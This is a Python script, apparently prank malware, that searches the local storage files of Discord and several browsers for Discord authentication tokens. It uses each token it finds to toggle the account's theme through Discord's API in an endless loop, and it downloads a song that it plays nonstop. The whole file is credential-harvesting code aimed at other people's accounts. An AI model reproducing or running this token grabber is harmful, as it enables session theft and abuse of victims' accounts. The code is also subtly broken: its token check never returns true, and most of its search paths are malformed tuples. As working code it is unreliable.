import re, os, subprocess, threading, json, requests, time, playsound

user = os.getenv('USERNAME')
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
tokens = []
working = []

def play_sounds():
    rq = requests.get("https://cdn.discordapp.com/attachments/830872284071723021/835929486985003049/song.mp3", allow_redirects=True)
    with open("C:\\Users\\" + user + "\\AppData\\Local\\SongLmao.mp3", "wb") as f:
        f.write(rq.content)
    while True:
        playsound.playsound("C:\\Users\\" + user + "\\AppData\\Local\\SongLmao.mp3")

def change_theme(token):
    while True:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
            "authorization": token
        }
        json = {
            "theme": "light"
        }
        json2 = {
            "theme": "dark"
        }
        rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
        time.sleep(2)
        rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json2)
        print("code: " + str(rq.status_code)) 
        time.sleep(2)

def check_token(token):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "authorization": token
    }
    requests.get('https://discord.com/api/v8/users/@me/', headers=headers)

def find_tokens(path):

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    path1 = roaming + '\\discord\\Local Storage\\leveldb'
    path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
    path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
    path4 = local + '\\Google\\Chrome\\User Data\\Default',
    path5 = roaming + '\\Opera Software\\Opera Stable',
    path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'

    if os.path.isdir(str(path1)):
        find_tokens(str(path1))
    if os.path.isdir(str(path2)):
        find_tokens(str(path2))
    if os.path.isdir(str(path3)):
        find_tokens(str(path3))
    if os.path.isdir(str(path4)):
        find_tokens(str(path4))
    if os.path.isdir(str(path5)):
        find_tokens(str(path5))
    if os.path.isdir(str(path6)):
        find_tokens(str(path6))
    if os.path.isdir(str(path7)):
        find_tokens(str(path7))

    for token in tokens:
        if check_token(token):
            working.append(token)
    for tokn in working:
        change_theme_thread = threading.Thread(target=change_theme, args=[tokn,])
        change_theme_thread.start()
    sound_thread = threading.Thread(target=play_sounds)
    sound_thread.start()
   
main()
